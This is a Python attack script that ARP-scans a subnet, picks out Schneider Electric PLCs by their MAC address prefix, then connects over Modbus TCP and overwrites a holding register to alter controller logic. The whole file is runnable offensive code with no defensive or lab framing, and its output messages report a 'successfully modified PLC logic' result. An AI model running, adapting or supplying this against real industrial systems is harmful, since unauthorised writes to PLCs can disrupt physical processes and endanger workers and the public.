from pymodbus.client import ModbusTcpClient
from scapy.all import ARP, Ether, srp
import ipaddress

# ---- Function to Find PLC IP Address ---- #
def find_plc(ip_range="192.168.1.0/24"):
    """
    Performs an ARP scan to identify the PLC's IP within the given subnet.
    Default subnet is set to 192.168.1.0/24 but can be modified.
    """
    print("[*] Scanning for PLC in subnet:", ip_range)
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)
    answered, _ = srp(request, timeout=2, verbose=False)

    for sent, received in answered:
        ip = received.psrc
        mac = received.hwsrc
        print(f"[+] Found device -> IP: {ip}, MAC: {mac}")

        # Check if the MAC Address matches Schneider Electric OUI
        if mac.startswith(("00:80:F4", "00:D0:2D")):
            print(f"[!] Potential PLC Found at {ip}")
            return ip

    print("[!] No PLC found in the network scan.")
    return None


# ---- Function to Modify PLC Program ---- #
def modify_plc_program(plc_ip):
    """
    Connects to the PLC's Modbus TCP interface and modifies program parameters.
    This could involve writing specific function codes to registers.
    """
    print(f"[*] Connecting to PLC at {plc_ip}...")
    
    client = ModbusTcpClient(plc_ip, port=502)
    
    if client.connect():
        print("[+] Connected to PLC. Attempting to modify program...")

        # Example: Write to holding register (MODBUS Function Code 0x06 or 0x10)
        # This could overwrite program logic if PLC is not properly hardened.

        register_address = 1000  # Example address where program logic is stored
        new_value = 1234  # New value to modify controller logic

        response = client.write_register(register_address, new_value, unit=1)

        if response.isError():
            print("[!] Failed to modify PLC program.")
        else:
            print("[+] Successfully modified PLC logic at register", register_address)

        client.close()
    else:
        print("[!] Connection to PLC failed.")


# ---- MAIN EXECUTION ---- #
if __name__ == "__main__":
    plc_ip = find_plc("192.168.1.0/24")

    if plc_ip:
        modify_plc_program(plc_ip)
    else:
        print("[-] No PLC detected. Exiting.")